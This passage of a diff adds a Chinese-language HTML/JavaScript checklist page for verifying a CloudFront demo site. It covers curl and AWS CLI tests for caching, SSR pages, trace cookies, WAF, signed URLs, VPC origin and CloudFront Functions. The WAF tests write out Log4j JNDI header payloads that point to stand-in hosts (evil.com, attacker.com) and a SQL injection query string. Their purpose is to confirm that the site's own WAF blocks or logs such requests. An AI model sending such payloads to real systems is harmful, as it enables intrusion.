+            troubleshoot: `404 — 路由未匹配或商品 ID 不存在`
+          },
+          {
+            id: "ssr-cart",
+            name: "4.4 购物车页",
+            desc: "购物车页面渲染正常",
+            cmd: `curl -s https://unice.keithyu.cloud/cart | grep -iE "<title>|cart"`,
+            expected: `包含 "购物车" 或 "Cart" 的页面标题`,
+            troubleshoot: `500 — EJS 模板渲染错误，检查 <code>pm2 logs</code>`
+          },
+          {
+            id: "ssr-login",
+            name: "4.5 登录页",
+            desc: "登录表单 + Cognito 集成",
+            cmd: `curl -s https://unice.keithyu.cloud/login | grep -iE "<title>|login|password"`,
+            expected: `包含登录表单元素 (用户名/密码输入框)`,
+            troubleshoot: `无表单元素 — 检查 EJS 模板是否正确引用 Cognito 配置`
+          },
+          {
+            id: "ssr-debug",
+            name: "4.6 调试页 (headers 表格)",
+            desc: "Headers 表格高亮显示 CloudFront 注入的 header",
+            cmd: `curl -s https://unice.keithyu.cloud/debug | grep -iE "x-trace-id|cloudfront-viewer-country|headers"`,
+            expected: `页面渲染 headers 表格，可见 CloudFront 注入的各类 header`,
+            troubleshoot: `所有 SSR 页面返回 500 — EJS 模板渲染错误，检查 <code>pm2 logs</code><br>404 JSON 而非 HTML — Express 路由未注册，检查 <code>server.js</code> 路由挂载`
+          }
+        ]
+      },
+
+      /* ==================== 5. UUID 追踪 ==================== */
+      {
+        id: "uuid", num: "5", title: "UUID 追踪 (x-trace-id)",
+        subtitle: "Cookie 持久化 & UUID 一致性验证",
+        tests: [{
+          id: "uuid-new",
+          name: "5.1 首次请求 (生成新 UUID)",
+          desc: "生成 UUID v4 → 通过 X-Trace-Id header 和 Set-Cookie 返回",
+          cmd: `curl -sI https://unice.keithyu.cloud/api/health | grep -iE "x-trace-id|set-cookie"`,
+          expected: `X-Trace-Id: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (UUID v4 格式)<br>Set-Cookie: x-trace-id=xxxxxxxx-...; Path=/; HttpOnly; Secure; SameSite=Lax`,
+          troubleshoot: `X-Trace-Id header 缺失 — <code>uuid-tracker</code> 中间件未加载，检查 server.js 中间件注册顺序`
+        },
+        {
+          id: "uuid-persist",
+          name: "5.2 带 Cookie 请求 (保持同一 UUID)",
+          desc: "携带 x-trace-id cookie 请求应保持同一 UUID, 且不再出现 Set-Cookie",
+          cmd: `# 获取 trace ID\nTRACE_ID=$(curl -sI https://unice.keithyu.cloud/api/health | grep -i "x-trace-id" | awk '{print $2}' | tr -d '\\r')\necho "Trace ID: $TRACE_ID"\n\n# 带 cookie 再次请求\ncurl -sI -b "x-trace-id=$TRACE_ID" https://unice.keithyu.cloud/api/health | grep -iE "x-trace-id|set-cookie"`,
+          expected: `X-Trace-Id 值与第一次请求相同<br>不再出现 Set-Cookie (已有 cookie, 无需重新设置)`,
+          troubleshoot: `每次请求都生成新 UUID — Cookie 未正确传递，检查 CloudFront Cache Policy 的 cookie 白名单是否包含 <code>x-trace-id</code><br>X-Trace-Id header 缺失 — <code>uuid-tracker</code> 中间件未加载`
+        }]
+      },
+
+      /* ==================== 6. WAF 安全防护 ==================== */
+      {
+        id: "waf", num: "6", title: "WAF 安全防护",
+        subtitle: "Log4j Block / SQLi Count / Rate Limit / Bot Control",
+        tests: [
+          {
+            id: "waf-log4j",
+            name: "6.1 Log4j 拦截 (Known Bad Inputs — Block 模式)",
+            desc: "JNDI payload 应被 WAF 拦截返回 403",
+            cmd: `# User-Agent 注入\ncurl -s -o /dev/null -w "HTTP Status: %{http_code}\\n" \\\n  -H 'User-Agent: \${jndi:ldap://evil.com/a}' \\\n  https://unice.keithyu.cloud/\n\n# X-Forwarded-For 注入 (另一种 Log4j payload 变体)\ncurl -s -o /dev/null -w "HTTP Status: %{http_code}\\n" \\\n  -H 'X-Forwarded-For: \${jndi:ldap://attacker.com/exploit}' \\\n  https://unice.keithyu.cloud/api/health`,
+            expected: `两次均返回 HTTP Status: 403`,
+            troubleshoot: `返回 200 — WAF Web ACL 未关联到 CloudFront Distribution，或 <code>AWSManagedRulesKnownBadInputsRuleSet</code> 被设为 Count 模式`
+          },
+          {
+            id: "waf-sqli",
+            name: "6.2 SQL 注入检测 (Common Rule Set — Count 模式)",
+            desc: "SQL 注入 payload 放行但记录 (Count 模式不拦截)",
+            cmd: `# 发送 SQL 注入 payload\ncurl -s -o /dev/null -w "HTTP Status: %{http_code}\\n" \\\n  "https://unice.keithyu.cloud/api/products?id=1%27%20OR%201%3D1"\n\n# CloudWatch Metrics 确认检测到 SQL 注入\naws cloudwatch get-metric-statistics \\\n  --namespace "AWS/WAFV2" \\\n  --metric-name "CountedRequests" \\\n  --dimensions Name=WebACL,Value=unice-demo-waf Name=Rule,Value=AWS-AWSManagedRulesCommonRuleSet Name=Region,Value=us-east-1 \\\n  --start-time $(date -u -d '10 minutes ago' +%Y-%m-%dT%H:%M:%S) \\\n  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \\\n  --period 300 --statistics Sum \\\n  --profile default --region us-east-1`,
+            expected: `HTTP Status: 200 (Count 模式不拦截, 仅记录)<br>CloudWatch Metrics 中 CountedRequests Sum > 0`,
+            troubleshoot: `返回 403 — Common Rule Set 被切换为 Block 模式 (<code>override_action { none {} }</code>)`
+          },
+          {
+            id: "waf-rate",
+            name: "6.3 速率限制 (2000 次/5 分钟)",
+            desc: "确认 RateLimitRule 规则已部署且为 Block 模式",
+            cmd: `# 验证速率限制规则已部署\naws wafv2 get-web-acl \\\n  --name unice-demo-waf --scope CLOUDFRONT \\\n  --id $(aws wafv2 list-web-acls --scope CLOUDFRONT \\\n    --profile default --region us-east-1 \\\n    --query "WebACLs[?Name=='unice-demo-waf'].Id" --output text) \\\n  --profile default --region us-east-1 \\\n  --query "WebACL.Rules[?Name=='RateLimitRule'].{Name:Name,Priority:Priority,Action:Action}" \\\n  --output table`,
+            expected: `规则存在, Priority=4, Action=Block<br>说明: 同一 IP 在 5 分钟内超过 2000 次请求将被封禁`,
+            troubleshoot: `规则不存在 — Terraform WAF 模块未 apply<br>可通过 CloudWatch Metrics 监控 RateLimitRule 触发次数`
+          },
+          {
+            id: "waf-bot",
+            name: "6.4 Bot Control (Count 模式)",
+            desc: "curl 默认 User-Agent 被识别为 HTTP Library, 但 Count 模式不阻断",
+            cmd: `# curl 使用默认 User-Agent (被识别为 HTTP Library)\ncurl -s -o /dev/null -w "HTTP Status: %{http_code}\\n" \\\n  https://unice.keithyu.cloud/api/health`,
+            expected: `HTTP Status: 200 (Bot Control 整体为 Count 模式, 且 CategoryHttpLibrary 和 SignalNonBrowserUserAgent 额外设为 Count, 不阻断 curl/API 客户端)`,
+            troubleshoot: `curl 返回 403 — Bot Control 被切换为 Block 模式, 或 <code>CategoryHttpLibrary</code> 的 rule_action_override 丢失<br>未启用 Bot Control — 检查 <code>enable_bot_control</code> 变量 (默认可能为 false, 需额外费用 $10/月)`
+          }
+        ]
+      },
+
+      /* ==================== 7. 签名 URL 保护 ==================== */
+      {
+        id: "signed", num: "7", title: "签名 URL 保护",
+        subtitle: "/premium/* 路径需要 CloudFront Signed URL",
+        tests: [
+          {
+            id: "signed-deny",
+            name: "7.1 无签名访问 /premium/* (应返回 403)",
+            desc: "直接访问 /premium/* 应返回 403, 并展示品牌化 403 错误页面",
+            cmd: `# 检查 HTTP 状态码\ncurl -sI https://unice.keithyu.cloud/premium/sample.html | grep -iE "HTTP/"\n\n# 查看 403 自定义错误页面内容\ncurl -s https://unice.keithyu.cloud/premium/sample.html | head -5`,
+            expected: `HTTP/2 403<br>品牌化 403 HTML 页面 (来自 /static/errors/403.html)`,
+            troubleshoot: `返回 200 — <code>enable_signed_url</code> 变量为 false, Trusted Key Group 未绑定<br>返回 404 — S3 中 /premium/ 前缀下无文件, 先上传测试文件:<br><code>echo "&lt;h1&gt;Premium Content&lt;/h1&gt;" | aws s3 cp - s3://$BUCKET/premium/sample.html --content-type "text/html"</code>`
+          },
+          {
+            id: "signed-allow",
+            name: "7.2 有签名访问",
+            desc: "使用 Terraform 生成的私钥签发 URL, 完整步骤参考 hands-on/06-cloudfront-signed-url.md",
+            cmd: `# 1. 确认私钥文件已生成\nls -la /root/keith-space/2026-project/longqi-cloudfront/terraform/keys/cf-private-key.pem\n\n# 2. 获取 Key Pair ID\nKEY_PAIR_ID=$(cd /root/keith-space/2026-project/longqi-cloudfront/terraform && \\\n  terraform output -raw cloudfront_public_key_id 2>/dev/null)\necho "Key Pair ID: $KEY_PAIR_ID"\n\n# 3. 使用 AWS CLI 签名 (需 aws cloudfront sign 命令或自行编写签名脚本)\n# 详细步骤参考: hands-on/06-cloudfront-signed-url.md`,
+            expected: `私钥文件存在; Key Pair ID 有值; 签名 URL 返回 200`,
+            troubleshoot: `私钥文件不存在 — Terraform 未 apply signed-url 模块<br>Key Pair ID 为空 — cloudfront_public_key_id output 未定义`
+          }
+        ]
+      },
+
+      /* ==================== 8. VPC Origin 安全隔离 ==================== */
+      {
+        id: "vpc", num: "8", title: "VPC Origin 安全隔离",
+        subtitle: "Internal ALB 仅可通过 CloudFront 访问",
+        tests: [
+          {
+            id: "vpc-direct",
+            name: "8.1 直接访问 Internal ALB DNS (应超时/不可达)",
+            desc: "Internal ALB 无公网 IP, 从 VPC 外部无法直连",
+            cmd: `# 获取 ALB DNS\nALB_DNS=$(cd /root/keith-space/2026-project/longqi-cloudfront/terraform && \\\n  terraform output -raw alb_dns_name)\necho "ALB DNS: $ALB_DNS"\n\n# 尝试直连 (5 秒超时)\ncurl --connect-timeout 5 http://$ALB_DNS/api/health 2>&1 || \\\n  echo "--- 无法直连 Internal ALB, VPC Origin 安全隔离生效 ---"`,
+            expected: `连接超时或 DNS 解析失败 (Internal ALB 无公网 IP, 无法从 VPC 外部访问)`,
+            troubleshoot: `Internal ALB 可从外部访问 — ALB 创建时 internal 参数未设为 true, 或安全组放行了 0.0.0.0/0`
+          },
+          {
+            id: "vpc-cf",
+            name: "8.2 通过 CloudFront 访问 (正常)",
+            desc: "经由 CloudFront VPC Origin 访问同一 ALB, 应正常返回",
+            cmd: `curl -s https://unice.keithyu.cloud/api/health | python3 -m json.tool`,
+            expected: `正常返回 {"status": "ok", ...}`,
+            troubleshoot: `返回 502 — CloudFront VPC Origin 配置错误, 检查 Origin domain / protocol / port`
+          }
+        ]
+      },
+
+      /* ==================== 9. Continuous Deployment (灰度发布) ==================== */
+      {
+        id: "cd", num: "9", title: "Continuous Deployment (灰度发布)",
+        subtitle: "Staging Distribution & CD Policy & SingleHeader / SingleWeight",
+        tests: [
+          {
+            id: "cd-staging",
+            name: "9.1 确认 Staging Distribution 已部署",
+            desc: "查看 Staging Distribution ID 和 CD Policy ID",
+            cmd: `cd /root/keith-space/2026-project/longqi-cloudfront/terraform\n\n# 查看 Staging Distribution ID\nterraform output -raw staging_distribution_id 2>/dev/null || \\\n  echo "Staging Distribution 未创建 (enable_continuous_deployment = false)"\n\n# 查看 CD Policy ID\nterraform output -raw cd_policy_id 2>/dev/null || echo "CD Policy 未创建"`,
+            expected: `Staging Distribution ID 和 CD Policy ID 均有值`,
+            troubleshoot: `未创建 — <code>enable_continuous_deployment = false</code>, 在 terraform.tfvars 中启用后 apply`
+          },
+          {
+            id: "cd-header",
+            name: "9.2 通过 Header 测试 Staging (SingleHeader 模式)",
+            desc: "如果 CD Policy 配置为 SingleHeader 模式, 带 aws-cf-cd-staging header 路由到 Staging",
+            cmd: `# 不带 header — 路由到 Production\ncurl -sI https://unice.keithyu.cloud/api/health | grep -iE "x-cache|x-amz-cf-pop"\n\n# 带 staging header — 路由到 Staging Distribution\ncurl -sI -H "aws-cf-cd-staging: true" https://unice.keithyu.cloud/api/health | grep -iE "x-cache|x-amz-cf-pop"`,
+            expected: `两次请求可能返回不同的 x-amz-cf-pop 或缓存行为差异`,
+            troubleshoot: `Staging 未生效 — CD Policy 的 enabled 为 false<br>Staging 返回 5xx — Staging Distribution 的源站配置与 Production 不一致`
+          },
+          {
+            id: "cd-weight",
+            name: "9.3 通过权重测试 Staging (SingleWeight 模式)",
+            desc: "如果 CD Policy 配置为 SingleWeight 模式, 一定百分比的流量自动路由到 Staging",
+            cmd: `# 多次请求可观察到不同 Distribution 的响应\nfor i in $(seq 1 10); do\n  echo "Request $i: $(curl -sI https://unice.keithyu.cloud/api/health 2>/dev/null | grep -i x-amz-cf-id | head -1)"\ndone`,
+            expected: `部分请求路由到 Staging Distribution, 可通过 x-amz-cf-id 差异观察`,
+            troubleshoot: `Staging 未生效 — CD Policy 的 enabled 为 false<br>Staging 返回 5xx — Staging Distribution 的源站配置与 Production 不一致`
+          }
+        ]
+      },
+
+      /* ==================== 10. Tag-Based Invalidation ==================== */
+      {
+        id: "tags", num: "10", title: "Tag-Based Invalidation",
+        subtitle: "DynamoDB + Lambda@Edge 标签失效机制",
+        tests: [
+          {
+            id: "tag-dynamo",
+            name: "10.1 确认 DynamoDB 表已创建",
+            desc: "unice-cache-tags 表状态应为 ACTIVE",
+            cmd: `aws dynamodb describe-table \\\n  --table-name unice-cache-tags \\\n  --profile default --region ap-northeast-1 \\\n  --query "Table.{Name:TableName,Status:TableStatus,ItemCount:ItemCount}" --output table`,
+            expected: `Status = ACTIVE`,
+            troubleshoot: `表不存在 — Terraform 未 apply tag-invalidation 模块`
+          },
+          {
+            id: "tag-lambda",
+            name: "10.2 确认 Lambda@Edge 已部署",
+            desc: "Origin Response Lambda (us-east-1) + Invalidation Trigger Lambda (ap-northeast-1)",
+            cmd: `# Origin Response Lambda (us-east-1)\naws lambda get-function \\\n  --function-name unice-demo-cache-tag-origin-response \\\n  --profile default --region us-east-1 \\\n  --query "Configuration.{Name:FunctionName,Runtime:Runtime,State:State}" --output table\n\n# Invalidation Trigger Lambda (ap-northeast-1)\naws lambda get-function \\\n  --function-name unice-demo-cache-tag-invalidation \\\n  --profile default --region ap-northeast-1 \\\n  --query "Configuration.{Name:FunctionName,Runtime:Runtime,State:State}" --output table`,
+            expected: `两个 Lambda 均为 State: Active, Runtime = nodejs20.x`,
+            troubleshoot: `Lambda 不存在 — 模块未部署<br>Lambda@Edge 执行错误 — 检查 us-east-1 区域的 CloudWatch Logs`
+          },
+          {
+            id: "tag-trigger",
+            name: "10.3 触发 Tag Invalidation",
+            desc: "完整验证流程: 源站设置 Cache-Tag header → Lambda@Edge 捕获 → DynamoDB 存储 → 管理 API 触发失效",
+            cmd: `# Tag-Based Invalidation 完整验证流程:\n# 1. 源站 API 在响应中设置 Cache-Tag header\n#    (如 Cache-Tag: product-1, category-hair)\n# 2. Lambda@Edge 在 Origin Response 阶段捕获 tag 并写入 DynamoDB\n# 3. 通过管理 API 触发失效\n\n# 查看 DynamoDB 中已收集的 tag 记录 (需认证)\n# 管理 API 需 Cognito JWT, 完整步骤参考:\n# hands-on/12-cloudfront-tag-based-invalidation.md`,
+            expected: `DynamoDB 表中存在 tag 记录; 通过管理 API 可触发基于 tag 的缓存失效`,
+            troubleshoot: `DynamoDB 表为空 — Lambda@Edge 未关联到 Distribution 的 Origin Response 事件<br>Lambda@Edge 执行错误 — 检查 us-east-1 区域的 CloudWatch Logs`
+          }
+        ]
+      },
+
+      /* ==================== 11. CloudFront Functions ==================== */
+      {
+        id: "cffunc", num: "11", title: "CloudFront Functions",
+        subtitle: "URL Rewrite / A/B Test / Geo Redirect / List All",
+        tests: [
+          {
+            id: "cf-rewrite",
+            name: "11.1 URL 重写 (默认 pass-through 模式)",
+            desc: "当 default_cf_function = \"url-rewrite\" 时, 验证 Function 已部署",
+            cmd: `aws cloudfront list-functions \\\n  --profile default \\\n  --query "FunctionList.Items[?contains(Name,'url-rewrite')].{Name:Name,Status:Status,Stage:FunctionMetadata.Stage}" \\\n  --output table`,
+            expected: `Function 状态为 UNASSOCIATED 或已关联到 Distribution`,
+            troubleshoot: `Function 未生效 — 检查 <code>publish = true</code> 且 Function 已关联到正确的 Behavior`
+          },
+          {
+            id: "cf-ab",
+            name: "11.2 A/B 测试 (切换 Function 后验证)",
+            desc: "将 default_cf_function 变量改为 \"ab-test\" 并 terraform apply 后验证",
+            cmd: `# 多次请求观察 A/B 分组\nfor i in $(seq 1 5); do\n  curl -sI https://unice.keithyu.cloud/ 2>/dev/null | grep -i "x-ab-group" || \\\n    echo "Request $i: no x-ab-group header"\ndone`,
+            expected: `请求被随机分配到 A 或 B 组, 通过 x-ab-group header 或 cookie 传递`,
+            troubleshoot: `未生效 — 检查 <code>publish = true</code> 且 Function 已关联到 Behavior<br>每个 Behavior 的每个事件类型只允许关联 1 个 CloudFront Function`
+          },
+          {
+            id: "cf-geo",
+            name: "11.3 地理重定向 (切换 Function 后验证)",
+            desc: "将 default_cf_function 变量改为 \"geo-redirect\" 并 terraform apply 后验证",
+            cmd: `curl -sI https://unice.keithyu.cloud/ | grep -iE "HTTP/|location"`,
+            expected: `来自中国 IP 的请求收到 302 重定向到 /cn/ 前缀路径`,
+            troubleshoot: `未重定向 — Function 未关联到默认 Behavior, 或 CloudFront-Viewer-Country header 未传递`
+          },
+          {
+            id: "cf-list",
+            name: "11.4 查看所有已部署的 CloudFront Functions",
+            desc: "列出当前账号下所有 CloudFront Functions 及其状态",
+            cmd: `aws cloudfront list-functions \\\n  --profile default \\\n  --query "FunctionList.Items[].{Name:Name,Stage:FunctionMetadata.Stage,Comment:FunctionConfig.Comment}" \\\n  --output table`,
+            expected: `列出所有 Functions: 包含 url-rewrite, ab-test, geo-redirect 等`,
+            troubleshoot: `Function 未生效 — 检查 <code>publish = true</code> 且 Function 已关联到正确的 Behavior<br>每个 Behavior 的每个事件类型只允许关联 1 个 CloudFront Function`
+          }
+        ]
+      },
+
+      /* ==================== 12. 地理限制 ==================== */
+      {
+        id: "geo", num: "12", title: "地理限制",
+        subtitle: "Blacklist: IR, KP & Viewer Country Header",
+        tests: [
+          {
+            id: "geo-config",
+            name: "12.1 确认地理限制配置",
+            desc: "确认 blacklist 模式及封禁国家列表 (默认: IR, KP)",
+            cmd: `cd /root/keith-space/2026-project/longqi-cloudfront/terraform\n\nDIST_ID=$(terraform output -raw cloudfront_distribution_id)\naws cloudfront get-distribution-config --id $DIST_ID --profile default \\\n  --query "DistributionConfig.Restrictions.GeoRestriction" --output json`,
+            expected: `RestrictionType: "blacklist", Quantity: 2, Items: ["IR", "KP"]`,
+            troubleshoot: `地理限制未生效 — <code>enable_geo_restriction</code> 变量为 false<br>WAF 的 GeoBlockRule 与 CloudFront 的 geo_restriction 是两层独立的地理限制, 可同时启用`
+          },
+          {
+            id: "geo-viewer",
+            name: "12.2 查看 CloudFront-Viewer-Country Header",
+            desc: "通过 /api/debug 查看请求来源的国家代码和城市名称",
+            cmd: `curl -s https://unice.keithyu.cloud/api/debug | python3 -c "\nimport json, sys\ndata = json.load(sys.stdin)\nprint('Viewer Country:', data.get('cloudfront', {}).get('viewerCountry', 'N/A'))\nprint('Viewer City:', data.get('cloudfront', {}).get('viewerCity', 'N/A'))\n"`,
+            expected: `显示请求来源的国家代码和城市名称`,
+            troubleshoot: `Viewer Country 为 N/A — CloudFront-Viewer-Country header 未传递到源站, 检查 Origin Request Policy`
+          }
+        ]
+      },
+
+      /* ==================== Browser Checklist ==================== */
+      {
+        id: "browser", num: "B", title: "Browser Verification",
+        subtitle: "Chrome DevTools 手动验证清单",
+        tests: [],
+        checklist: [
+          { id: "br-home", text: "首页 — hero 区域 + 推荐商品网格 (最多 8 个)" },
+          { id: "br-list", text: "商品列表 — 商品卡片 + 分类筛选 + 分页导航" },
+          { id: "br-detail", text: "商品详情 — 商品图片 + 价格 + 加入购物车按钮" },
+          { id: "br-cart", text: "购物车 — 购物车页面渲染正常" },
+          { id: "br-login", text: "登录/注册 — 登录表单 + Cognito 集成" },
+          { id: "br-debug", text: "调试页 — headers 表格高亮显示 CloudFront 注入的 header" },
+          { id: "br-404", text: "404 错误页 — 品牌化错误页面 (非默认白页)" },
+          { id: "br-trace", text: "DevTools: 响应 header 中包含 X-Trace-Id (UUID 格式)" },
+          { id: "br-cache", text: "DevTools: x-cache 首次 Miss, 刷新后 Hit (缓存生效)" },
+          { id: "br-pop", text: "DevTools: x-amz-cf-pop 显示最近的 CloudFront 边缘节点 POP 代码" },
+          { id: "br-static", text: "DevTools: CSS/JS 资源通过 /static/ 路径加载 (来自 S3 OAC)" },
+          { id: "br-cookie", text: "DevTools: Application > Cookies 中可见 x-trace-id cookie (HttpOnly)" }
+        ]
+      }
+    ];
+
+    /* Summary table data (matches VERIFY.md 验证状态总结 table) */
+    const SUMMARY_ROWS = [
+      { num: "1.1", feature: "Health Check", cmd: "curl /api/health", expected: "status: ok", testId: "conn-health" },
+      { num: "1.2", feature: "Debug Headers", cmd: "curl /api/debug", expected: "cloudfront 字段有值", testId: "conn-debug" },
+      { num: "1.3", feature: "Delay Test", cmd: "curl /api/delay/2000", expected: "actual ~2000ms", testId: "conn-delay" },
+      { num: "2.1", feature: "S3 OAC CSS", cmd: "curl /static/css/style.css", expected: "200 via CF, 403 direct", testId: "s3-css" },
+      { num: "2.3", feature: "Error Pages", cmd: "curl /nonexistent", expected: "品牌化 404 HTML", testId: "s3-error" },
+      { num: "3.1", feature: "ProductCache", cmd: "两次 curl /api/products", expected: "Miss → Hit", testId: "cache-product" },
+      { num: "3.2", feature: "CachingDisabled", cmd: "两次 curl /api/debug", expected: "均 Miss", testId: "cache-disabled" },
+      { num: "4.1", feature: "SSR 首页", cmd: "curl /", expected: "EJS 渲染 HTML", testId: "ssr-home" },
+      { num: "4.2", feature: "SSR 商品列表", cmd: "curl /products", expected: "商品卡片 + 分页", testId: "ssr-list" },
+      { num: "4.3", feature: "SSR 商品详情", cmd: "curl /products/1", expected: "图片 + 价格 + 加购", testId: "ssr-detail" },
+      { num: "4.4", feature: "SSR 购物车", cmd: "curl /cart", expected: "购物车页面", testId: "ssr-cart" },
+      { num: "4.5", feature: "SSR 登录页", cmd: "curl /login", expected: "登录表单", testId: "ssr-login" },
+      { num: "4.6", feature: "SSR 调试页", cmd: "curl /debug", expected: "headers 表格", testId: "ssr-debug" },
+      { num: "5", feature: "UUID 追踪", cmd: "带/不带 cookie 请求", expected: "UUID 一致", testId: "uuid-persist" },
+      { num: "6.1", feature: "WAF Log4j", cmd: "jndi payload", expected: "403", testId: "waf-log4j" },
+      { num: "6.2", feature: "WAF SQLi", cmd: "SQL 注入 QS", expected: "200 (Count)", testId: "waf-sqli" },
+      { num: "7.1", feature: "Signed URL", cmd: "无签名 /premium/*", expected: "403", testId: "signed-deny" },
+      { num: "8", feature: "VPC Origin", cmd: "直连 ALB", expected: "超时", testId: "vpc-direct" },
+      { num: "9.1", feature: "CD Staging", cmd: "terraform output", expected: "Staging ID 有值", testId: "cd-staging" },
+      { num: "9.3", feature: "CD Weight", cmd: "10 次请求", expected: "不同 Distribution", testId: "cd-weight" },
+      { num: "10.1", feature: "Tag DynamoDB", cmd: "describe-table", expected: "ACTIVE", testId: "tag-dynamo" },
+      { num: "10.2", feature: "Tag Lambda@Edge", cmd: "get-function", expected: "Active", testId: "tag-lambda" },
+      { num: "11.1", feature: "CF Functions", cmd: "list-functions", expected: "函数已部署", testId: "cf-rewrite" },
+      { num: "12.1", feature: "Geo Restriction", cmd: "get-distribution-config", expected: "blacklist IR,KP", testId: "geo-config" },
+    ];
+
+    /* ===========================================
+       RENDER ENGINE
+       =========================================== */
+    const $ = s => document.querySelector(s);
+    const $$ = s => document.querySelectorAll(s);
+
+    const ICONS = {
+      check: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`,
+      x: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>`,
+      skip: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="5" y1="12" x2="19" y2="12"/></svg>`,
+      copy: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>`,
+      chevron: `<svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>`,
+      arrow: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>`
+    };
+
+    const STATE_KEY = 'cf-verify-state-v2';
+    let state = loadState();
+
+    function loadState() {
+      try { return JSON.parse(localStorage.getItem(STATE_KEY)) || {}; }
+      catch { return {}; }
+    }
+
+    function saveState() {
+      localStorage.setItem(STATE_KEY, JSON.stringify(state));
+    }
+
+    function getTestStatus(testId) {
+      return state[testId] || null;
+    }
+
+    function setTestStatus(testId, status) {
+      if (state[testId] === status) delete state[testId];
+      else state[testId] = status;
+      saveState();
+      updateStats();
+      updateSectionBadges();
+      updateSummaryTable();
+      updateButtonVisuals(testId);
+    }
+
+    function updateButtonVisuals(testId) {
+      const btn = document.querySelector(`[data-test-pass="${testId}"]`);
+      if (!btn) return;
+      const item = btn.closest('.test-item');
+      if (!item) return;
+      const btns = item.querySelectorAll('.status-btn');
+      btns.forEach(b => b.className = 'status-btn');
+      const current = getTestStatus(testId);
+      if (current === 'pass') btns[0].classList.add('active-pass');
+      if (current === 'fail') btns[1].classList.add('active-fail');
+      if (current === 'skip') btns[2].classList.add('active-skip');
+    }
+
+    function escapeHtml(text) {
+      const div = document.createElement('div');
+      div.textContent = text;
+      return div.innerHTML;
+    }
+
+    function render() {
+      const container = $('#sections');
+      let html = '';
+
+      SECTIONS.forEach((section, idx) => {
+        const testCount = (section.tests?.length || 0) + (section.checklist?.length || 0);
+        html += `
+          <div class="section-card" data-section="${section.id}" style="transition-delay: ${0.05 * idx}s">
+            <div class="section-header" onclick="toggleSection('${section.id}')">
+              <div class="section-num">${section.num}</div>
+              <div class="section-title-group">
+                <div class="section-title">${section.title}</div>
+                <div class="section-subtitle">${section.subtitle}</div>
+              </div>
+              <div class="section-status">
+                <span class="section-badge" data-badge="${section.id}">0/${testCount}</span>
+                ${ICONS.chevron}
+              </div>
+            </div>
+            <div class="section-body">
+              <div class="section-inner">`;
+
+        if (section.tests) {
+          section.tests.forEach(test => {
+            const s = getTestStatus(test.id);
+            html += `
+                <div class="test-item">
+                  <div class="test-header">
+                    <div>
+                      <div class="test-name">${test.name}</div>
+                      <div class="test-desc">${test.desc}</div>
+                    </div>
+                    <div class="status-toggle">
+                      <button class="status-btn ${s==='pass'?'active-pass':''}" data-test-pass="${test.id}" onclick="setTestStatus('${test.id}','pass')" title="Pass">${ICONS.check}</button>
+                      <button class="status-btn ${s==='fail'?'active-fail':''}" onclick="setTestStatus('${test.id}','fail')" title="Fail">${ICONS.x}</button>
+                      <button class="status-btn ${s==='skip'?'active-skip':''}" onclick="setTestStatus('${test.id}','skip')" title="Skip">${ICONS.skip}</button>
+                    </div>
+                  </div>
+                  <div class="code-block">
+                    <div class="code-label">
+                      <span>bash</span>
+                      <button class="copy-btn" onclick="copyCmd(this, \`${encodeURIComponent(test.cmd)}\`)">${ICONS.copy} copy</button>
+                    </div>
+                    <div class="code-content">${escapeHtml(test.cmd)}</div>
+                  </div>
+                  <div class="expected"><strong>Expected:</strong> ${test.expected}</div>
+                  ${test.troubleshoot ? `
+                  <div class="troubleshoot">
+                    <button class="troubleshoot-toggle" onclick="this.parentElement.classList.toggle('open')">
+                      ${ICONS.arrow} Troubleshoot
+                    </button>
+                    <div class="troubleshoot-body">
+                      <div class="troubleshoot-content">${test.troubleshoot}</div>
+                    </div>
+                  </div>` : ''}
+                </div>`;
+          });
+        }
+
+        if (section.checklist) {
+          html += `<div class="checklist-grid">`;
+          section.checklist.forEach(item => {
+            const checked = getTestStatus(item.id) === 'pass';
+            html += `
+              <div class="check-item ${checked?'checked':''}" onclick="toggleCheck('${item.id}', this)">
+                <div class="check-box">${ICONS.check}</div>
+                <span>${item.text}</span>
+              </div>`;
+          });
+          html += `</div>`;
+        }
+
+        html += `</div></div></div>`;
+      });
+
+      container.innerHTML = html;
+      observeSections();
+      updateStats();
+      updateSectionBadges();
+      renderSummaryTable();
+    }
+
+    /* ===========================================
+       INTERACTIONS
+       =========================================== */
+    function toggleSection(id) {
+      $(`[data-section="${id}"]`).classList.toggle('open');
+    }
+
+    function copyCmd(btn, encodedCmd) {
+      navigator.clipboard.writeText(decodeURIComponent(encodedCmd)).then(() => {
+        btn.classList.add('copied');
+        btn.innerHTML = `${ICONS.check} copied`;
+        setTimeout(() => {
+          btn.classList.remove('copied');
+          btn.innerHTML = `${ICONS.copy} copy`;
+        }, 1500);
+      });
+    }
+
+    function toggleCheck(id, el) {
+      const isChecked = el.classList.contains('checked');
+      if (isChecked) { el.classList.remove('checked'); delete state[id]; }
+      else { el.classList.add('checked'); state[id] = 'pass'; }
+      saveState();
+      updateStats();
+      updateSectionBadges();
+      updateSummaryTable();
+    }
+
+    /* ===========================================
+       STATS & BADGES
+       =========================================== */
+    function getAllTestIds() {
+      const ids = [];
+      SECTIONS.forEach(s => {
+        if (s.tests) s.tests.forEach(t => ids.push(t.id));
+        if (s.checklist) s.checklist.forEach(c => ids.push(c.id));
+      });
+      return ids;
+    }
+
+    function updateStats() {
+      const all = getAllTestIds();
+      let pass = 0, fail = 0, skip = 0;
+      all.forEach(id => {
+        const s = state[id];
+        if (s === 'pass') pass++;
